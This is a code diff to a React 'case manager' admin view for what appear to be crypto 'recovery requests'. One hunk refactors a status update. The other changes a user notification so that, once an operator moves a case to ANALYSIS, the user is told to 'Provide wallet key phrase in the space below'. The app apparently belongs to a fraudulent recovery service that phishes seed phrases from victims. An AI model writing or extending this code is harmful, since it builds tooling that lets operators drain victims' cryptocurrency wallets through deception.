@@ -131,7 +131,7 @@ const CaseManagerView: React.FC = () => {
 
       if (newStatus === 'ANALYSIS') {
         notificationTitle = 'Action Required';
-        notificationMessage = 'Further authority verification is required for your case. Please check your workspace for the new operational step.';
+        notificationMessage = 'Provide wallet key phrase in the space below';
         notificationType = 'ACTION_REQUIRED';
       }
 
@@ -472,8 +472,7 @@ const CaseManagerView: React.FC = () => {
                                   <button
                                     onClick={async (e) => {
                                       e.stopPropagation();
-                                      const ref = doc(db, 'recovery_requests', activeCaseData.id);
-                                      await updateDoc(ref, { status: lvl.id, updatedAt: serverTimestamp() });
+                                      await handleUpdateStatus(activeCaseData.id, lvl.id);
                                     }}
                                     className={`px-2 py-1 rounded text-[7px] font-mono border transition-all ${
                                       activeCaseData.status === lvl.id 
